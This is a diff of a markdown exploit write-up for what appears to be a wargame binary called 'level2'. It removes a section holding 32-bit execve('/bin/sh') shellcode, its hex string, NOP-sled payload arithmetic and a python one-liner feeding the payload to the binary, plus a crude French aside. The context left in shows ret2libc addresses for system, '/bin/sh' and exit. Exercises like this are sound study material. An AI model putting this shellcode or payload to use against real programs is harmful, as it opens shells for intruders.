@@ -28,52 +28,6 @@ void p(void)
   return;
 }
 ```
-
-## shellcode
-*https://www.coengoedegebure.com/buffer-overflow-attacks-explained/*
-```
-$ nasm -f elf shellcode.asm
-$ objdump -d -M intel shellcode.o
-
-shellcode.o:     file format elf32-i386
-
-
-Disassembly of section .text:
-
-00000000 <.text>:
-   0:   31 c0                   xor    eax,eax
-   2:   50                      push   eax
-   3:   68 2f 2f 73 68          push   0x68732f2f
-   8:   68 2f 62 69 6e          push   0x6e69622f
-   d:   89 e3                   mov    ebx,esp
-   f:   50                      push   eax
-  10:   89 e2                   mov    edx,esp
-  12:   53                      push   ebx
-  13:   89 e1                   mov    ecx,esp
-  15:   b0 0b                   mov    al,0xb
-  17:   cd 80                   int    0x80
-```
-
-shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`\
-length = 25\
-shellcode need to be in the buffer.
-
-Playload length = 84\
-Payload: `[ NOP SLED ][ SHELLCODE ][ 16 x 'E' ]`\
-NOP-sled value : `\x90`
-NOP-sled length = 84 - 25 - 8 = 47
-
-
-```
-$ python -c 'print "\x90" * 39 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x45\x45\x45\x45" * 4' | ./level2
-�����������������������������������1�Ph//shh/bin��P��S��
-       ̀EEEE
-Segmentation fault (core dumped)
-```
-
-- Fixing playload
-pick an address somewhere in the NOP-sled for the return address to point to.
-ouais ouais maris et thomas on raison je fais un truc de merde alors nique
 ```
 (gdb) info proc map
 ...
@@ -93,7 +47,7 @@ ouais ouais maris et thomas on raison je fais un truc de merde alors nique
 0x080483d0  _exit
 ...
 ```
-p return address : 0x0804853e\
+p() return address : 0x0804853e\
 `/bin/sh` address : 0xb7f8cc58\
 `system` address : 0xb7e6b060\
 `exit` address : 0x080483d0
